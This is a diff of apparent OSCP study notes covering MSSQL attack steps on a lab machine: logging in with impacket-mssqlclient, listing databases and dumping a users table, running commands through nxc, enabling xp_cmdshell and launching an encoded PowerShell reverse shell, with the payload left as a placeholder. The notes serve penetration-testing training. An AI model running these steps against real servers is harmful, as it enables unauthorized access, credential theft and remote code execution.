@@ -34,9 +34,10 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 or
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-const command = `impacket-mssqlclient [User]:[Password]@${ip} -windows-auth`;
+const command = `impacket-mssqlclient '${discoveredDomain}/[user]:[PW]@${discoveredDomain}'`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -47,49 +48,24 @@ SELECT name FROM master.dbo.sysdatabases
 
 Show me every database in this master system
 
-RESULT
+![[Pasted image 20260918035607.png]]
+
+(These are all default DBs)
 
 ```
-name
---------------------------------------------------
-master
-tempdb
-model
-msdb
-htbusers
+USE msdb;
 ```
 
-```
-USE htbusers;
-```
-
-RESULT
-```cmd-session
-Changed database context to 'htbusers'.
-```
+![[Pasted image 20260918035636.png]]
 
 ```
-SELECT table_name FROM [htbusers].INFORMATION_SCHEMA.TABLES
+SELECT table_name FROM [msdb].INFORMATION_SCHEMA.TABLES;
 ```
 
-RESULT
+![[Pasted image 20260918035740.png]]
 
 ```cmd-session
-table_name
---------------------------------
-actions
-permissions
-permissions_roles
-permissions_users
-roles      
-roles_users
-settings
-users 
-(8 rows affected)
-```
-
-```cmd-session
-SELECT * FROM users
+SELECT * FROM backupset;
 
 GO
 ```
@@ -107,22 +83,47 @@ id          username             password         data_of_joining
 (4 rows affected)
 ```
 
+---
+
+Run commands through NXC
+
+```
+nxc mssql dc01.sequel.htb -u [user] -p '[password]' --local-auth -x whoami
+```
+
 XP_CMDSHELL
 
 ```
- xp_cmdshell 'whoami'
-
-GO
+xp_cmdshell whoami
 ```
 
-RESULT 
+![[Pasted image 20260918041913.png]]
 
-```cmd-session
-output
------------------------------
-no service\mssql$sqlexpress
-NULL
-(2 rows affected)
+xp_cmdshell still disabled
+
+enable it
+
+```
+enable_xp_cmdshell
+```
+
+```
+xp_cmdshell whoami
+```
+
+![[Pasted image 20260918042013.png]]
+
+![[Pasted image 20260918042033.png]]
+
+https://shellgenerator.dev/ 
+
+OS > Windows
+Shell > Powershell.exe
+Payload selection > Powershell
+Powershell #3 base64
+
+```
+xp_cmdshell powershell -e [payload]
 ```
 
 ```mssql
